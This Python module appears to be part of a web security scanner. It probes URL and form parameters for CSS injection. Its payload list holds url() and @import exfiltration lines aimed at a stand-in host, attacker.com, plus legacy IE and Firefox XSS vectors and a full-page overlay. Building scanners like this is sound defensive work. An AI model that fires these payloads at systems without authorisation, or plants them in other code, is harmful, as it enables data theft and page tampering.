"""CSS Injection Scanner — detects CSS-based data exfiltration and UI redress.

Tests for:
- CSS injection via user-controlled input
- Data exfiltration via CSS url() functions
- UI redressing / clickjacking via injected styles
"""

from __future__ import annotations

import re
from typing import List
from urllib.parse import urlparse

from .findings import Finding
from ..core.logger import logger
from ..core.ratelimit import get_limiter


# CSS injection payloads
CSS_PAYLOADS = [
    ('background: url(http://attacker.com/exfil?data=test)', "CSS url() exfil"),
    ('background-image: url(http://attacker.com/exfil)', "Background image exfil"),
    ('list-style-image: url(http://attacker.com/exfil)', "List style exfil"),
    ('cursor: url(http://attacker.com/exfil), auto', "Cursor exfil"),
    ('border-image: url(http://attacker.com/exfil)', "Border image exfil"),
    ('content: url(http://attacker.com/exfil)', "Content exfil"),
    ('@import url("http://attacker.com/steal.css")', "CSS @import exfil"),
    ('behavior: url(http://attacker.com/xss.htc)', "IE behavior XSS"),
    ('-moz-binding: url(http://attacker.com/xss.xml#xss)', "Firefox binding XSS"),
    ('position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 9999; background: red;', "UI redress overlay"),
    ('color: expression(alert(1))', "IE expression XSS"),
    ('width: expression(alert(1))', "IE expression XSS"),
]


class CSSInjectionScanner:
    """Detects CSS injection vulnerabilities."""

    NAME = "css_injection"

    def __init__(self, rps: float = 5.0, timeout: float = 10.0):
        self.limiter = get_limiter(rps)
        self.timeout = timeout

    def scan_url(self, url: str, **kwargs) -> List[Finding]:
        """Scan URL for CSS injection vulnerabilities."""
        import httpx

        findings: List[Finding] = []
        parsed = urlparse(url)
        host = parsed.netloc

        client = httpx.Client(
            verify=False, timeout=self.timeout, follow_redirects=True,
            headers={"User-Agent": "Mozilla/5.0"},
        )

        try:
            # Get page to find injection points
            self.limiter.wait(host)
            try:
                resp = client.get(url)
                body = resp.text
            except Exception:
                return findings

            # Find style-related attributes and parameters
            injection_params = self._find_injection_points(body)

            # Test each payload
            for payload, description in CSS_PAYLOADS:
                # Test in parameters
                for param in injection_params[:5]:
                    sep = "&" if "?" in url else "?"
                    test_url = f"{url}{sep}{param}={payload}"
                    self.limiter.wait(host)
                    try:
                        resp = client.get(test_url)
                        if payload in resp.text or payload.replace('"', '&quot;') in resp.text:
                            findings.append(Finding(
                                vuln_type="CSS Injection",
                                title=f"CSS injection via parameter: {param}",
                                severity="MEDIUM",
                                url=test_url,
                                parameter=param,
                                method="GET",
                                payload=payload[:200],
                                evidence=f"CSS payload reflected in response via '{param}'",
                                description=f"Parameter '{param}' reflects CSS without sanitization. {description}.",
                                remediation="Sanitize user input. Remove CSS properties and url() functions.",
                                cvss=5.3, cwe="CWE-79",
                                tool=self.NAME, verified=True, confidence="MEDIUM",
                            ))
                    except Exception:
                        pass

                # Test via POST
                for param in injection_params[:3]:
                    self.limiter.wait(host)
                    try:
                        resp = client.post(url, data={param: payload})
                        if payload in resp.text:
                            findings.append(Finding(
                                vuln_type="CSS Injection",
                                title=f"CSS injection via POST param: {param}",
                                severity="MEDIUM",
                                url=url,
                                parameter=param,
                                method="POST",
                                payload=payload[:200],
                                evidence=f"CSS payload reflected via POST '{param}'",
                                description=f"POST parameter '{param}' reflects CSS. {description}.",
                                remediation="Sanitize CSS output. Use Content-Security-Policy style-src.",
                                cvss=5.3, cwe="CWE-79",
                                tool=self.NAME, verified=True, confidence="MEDIUM",
                            ))
                    except Exception:
                        pass

            # Check for inline style injection via attributes
            style_attrs = re.findall(r'style=["\']([^"\']*)["\']', body, re.I)
            if style_attrs:
                for param in injection_params[:3]:
                    for payload, desc in CSS_PAYLOADS[:3]:
                        test_url = f"{url}{'&' if '?' in url else '?'}{param}={payload}"
                        self.limiter.wait(host)
                        try:
                            resp = client.get(test_url)
                            # Check if the style attribute contains our payload
                            new_style_attrs = re.findall(r'style=["\']([^"\']*)["\']', resp.text, re.I)
                            for attr in new_style_attrs:
                                if "attacker.com" in attr or "expression" in attr or "behavior" in attr:
                                    findings.append(Finding(
                                        vuln_type="CSS Injection",
                                        title=f"Inline style CSS injection: {desc}",
                                        severity="HIGH",
                                        url=test_url,
                                        parameter=param,
                                        payload=payload[:200],
                                        evidence=f"Injected CSS in style attribute: {attr[:100]}",
                                        description=f"CSS injection into style attribute. {desc}.",
                                        remediation="Sanitize all style attributes. Use CSP style-src.",
                                        cvss=6.5, cwe="CWE-79",
                                        tool=self.NAME, verified=True, confidence="HIGH",
                                    ))
                                    break
                        except Exception:
                            pass

        finally:
            client.close()

        logger.info(f"CSS injection scan: {len(findings)} findings")
        return findings

    def _find_injection_points(self, body: str) -> List[str]:
        """Find parameters that might accept CSS input."""
        params = []

        # Form inputs
        input_pattern = re.compile(r'<input[^>]*name=["\']([^"\']+)["\'][^>]*>', re.I)
        params.extend(input_pattern.findall(body))

        # Textareas
        textarea_pattern = re.compile(r'<textarea[^>]*name=["\']([^"\']+)["\'][^>]*>', re.I)
        params.extend(textarea_pattern.findall(body))

        # URL parameters that might accept style/color
        style_params = ["style", "color", "background", "theme", "css", "class", "className"]
        params.extend(style_params)

        return list(dict.fromkeys(params))  # Deduplicate


__all__ = ["CSSInjectionScanner"]
